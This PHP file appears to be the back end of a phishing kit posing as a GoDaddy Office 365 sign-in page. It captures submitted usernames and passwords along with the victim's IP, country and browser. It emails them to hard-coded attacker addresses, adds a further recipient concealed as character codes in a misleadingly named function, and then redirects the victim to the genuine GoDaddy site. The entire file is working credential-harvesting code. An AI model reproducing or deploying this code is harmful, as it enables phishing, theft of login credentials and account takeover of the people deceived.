<?

 /*
 
  */
$country = visitor_country();  
$email=$_GET['email'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$browser  =     $_SERVER['HTTP_USER_AGENT'];
$message  =     "=============+[ User Info ]+==============\n";
$message .=     "Username : ".$_POST['name']."\n";
$message .=     "Correct Password : ".$_POST['password']."\n";
$message .=     "Referer  : {$_POST['referer']}\n";
$message .=     "=============+[ Location Info ]+===============\n";
$message .=     "IP: ".$ip."\n";
$message .=     "Country : ".$country."\n";
$message .=     "=======================================\n";
$message .= 	"User-Agent: ".$browser."\n";
$message .=     "=======================================\n";
$message .=     "Date  & Time Log  : ".$adddate."\n";
$message .=     "=======================================\n";
$sniper = 'Other Godaddy';
$who_be_the_boss = 'Gd';
$subj = "$sniper Login $ip $adddate\n";
$from = "From: $who_be_the_boss <west>\n";
$arr = country_sort();
foreach ($arr as $recipient)
{
mail("goodman443442@gmail.com,goodman443442@yandex.ru",$subj,$message,$from,$sniper);
}

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

header("Location: https://www.godaddy.com/business/office-365.aspx");

?>